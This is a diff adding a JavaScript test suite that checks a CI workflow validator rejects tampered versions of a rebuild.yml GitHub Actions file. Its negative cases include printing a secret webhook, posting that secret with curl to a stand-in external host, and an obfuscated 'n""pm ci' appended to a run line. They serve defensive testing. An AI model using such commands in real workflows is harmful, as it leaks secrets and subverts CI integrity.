@@ -194,6 +194,32 @@ describe('check-workflows rebuild.yml (AC-R0-03)', () => {
   });
 });
 
+describe('check-workflows rebuild.yml exact shape (AC-R0-07)', () => {
+  const RUN = `test -n "$HOOK" && curl -fsS -X POST --max-time 20 "$HOOK" -o /dev/null -w 'status=%{http_code}\\n'`;
+  const shape = async (text) => (await import(CHECK)).checkWorkflow('rebuild.yml', text);
+  const bad = (label, mutate) =>
+    it(`rebuild_shape: ${label}`, async () => {
+      const text = mutate(REBUILD);
+      expect(text).not.toBe(REBUILD);
+      expect((await shape(text)).join('\n')).toContain('rebuild_shape');
+    });
+  bad('run prints the hook', (t) => t.replace(RUN, `printf '%s\\n' "$HOOK"`));
+  bad('run posts the hook to another URL', (t) => t.replace(RUN, `curl -fsS -X POST -d "$HOOK" https://example.invalid/x`));
+  bad('a second job', (t) => t + '  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n');
+  bad('a second step', (t) => t + '      - run: echo two\n');
+  bad('cron every 5 minutes', (t) => t.replace('0 13 * * *', '*/5 * * * *'));
+  bad('job-level permissions contents: read', (t) => t.replace('    timeout-minutes: 2\n', '    timeout-minutes: 2\n    permissions: { contents: read }\n'));
+  bad('run containing n""pm ci', (t) => t.replace(RUN, RUN + ' && n""pm ci'));
+  bad('an extra env key', (t) => t.replace("env: { HOOK:", "env: { EXTRA: x, HOOK:"));
+  bad('timeout-minutes 30', (t) => t.replace('timeout-minutes: 2', 'timeout-minutes: 30'));
+  it('the real rebuild.yml returns []', async () => {
+    const { readFileSync } = await import('node:fs');
+    const real = readFileSync(join(REPO_ROOT, '.github', 'workflows', 'rebuild.yml'), 'utf8');
+    expect(await shape(real)).toEqual([]);
+    expect(await shape(REBUILD)).toEqual([]);
+  });
+});
+
 describe('check-workflows adversarial cases (AC-M0-16)', () => {
   it('passes a ci.yml with an identity job', () => passes({ 'ci.yml': CI + IDENTITY_JOB }));
 
